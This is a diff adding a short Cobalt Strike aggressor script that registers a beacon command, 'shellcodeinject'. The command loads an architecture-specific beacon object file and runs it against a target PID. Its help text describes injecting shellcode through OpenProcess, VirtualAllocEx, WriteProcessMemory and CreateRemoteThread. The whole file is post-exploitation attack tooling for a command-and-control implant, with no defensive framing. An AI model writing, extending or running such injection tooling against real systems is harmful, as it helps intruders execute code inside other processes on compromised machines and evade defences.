@@ -1,0 +1,32 @@
+# $1 = beacon ID
+# $2 = pid
+
+alias shellcodeinject {
+	local('$handle $pid');
+
+	# check our arguments
+	if (size(@_) != 2) {
+		berror($1, "shellcodeinject: not enough arguments. Enter the PID");
+		return;
+	}
+
+	# parse our arguments
+	$pid	= $2;
+
+	# read in our BOF file...
+	$arch = barch($1);
+	$handle = openf(script_resource("shellcodeinject. $+ $arch $+ .o"));
+	$data	= readb($handle, -1);
+	closef($handle);
+
+	# pack our arguments
+	$args	= bof_pack($1, "s", $pid);
+
+	# announce to our user..
+	btask($1, "Injecting into PID $2");
+
+	# run a BOF
+	beacon_inline_execute($1, $data, "go", $args);
+}
+beacon_command_register("shellcodeinject", "Basic PE shellcode injection method", "Synopsis: shellcodeinject [pid] \n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread Win32APIs in a beacon object file to inject into a target PID.");
+
